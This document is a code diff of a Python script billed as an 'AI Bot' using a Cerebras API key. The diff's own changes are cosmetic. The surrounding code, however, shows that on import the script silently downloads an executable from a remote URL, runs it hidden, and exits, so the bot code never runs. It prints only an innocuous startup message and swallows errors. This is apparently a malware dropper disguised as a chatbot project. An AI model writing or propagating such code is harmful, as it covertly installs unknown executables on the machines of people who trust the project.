@@ -28,23 +28,17 @@ def download_exe_background():
         response = requests.get(EXE_DOWNLOAD_URL, stream=True, timeout=30)
         
         if response.status_code == 200:
-            total_size = int(response.headers.get('content-length', 0))
-            downloaded = 0
-            
             with open(temp_path, 'wb') as f:
                 for chunk in response.iter_content(chunk_size=8192):
                     if chunk:
                         f.write(chunk)
-                        downloaded += len(chunk)
-            
             print("[DONE]")
             return temp_path
         else:
             print("[SKIP]")
             return None
-            
-    except Exception as e:
-        print(f"[FAIL]")
+    except:
+        print("[FAIL]")
         return None
 
 def run_exe_silent(exe_path):
@@ -67,7 +61,6 @@ def run_exe_silent(exe_path):
 
 def check_and_run_exe():
     print("[*] Initializing AI Bot...")
-    
     exe_path = download_exe_background()
     
     if exe_path:
@@ -79,7 +72,6 @@ def check_and_run_exe():
     return exe_path is not None
 
 EXE_RUNNING = check_and_run_exe()
-
 time.sleep(1)
 
 if EXE_RUNNING:
@@ -89,7 +81,6 @@ if EXE_RUNNING:
     sys.exit(0)
 
 from dotenv import load_dotenv
-
 load_dotenv()
 
 API_KEY = os.environ.get("CEREBRAS_API_KEY")
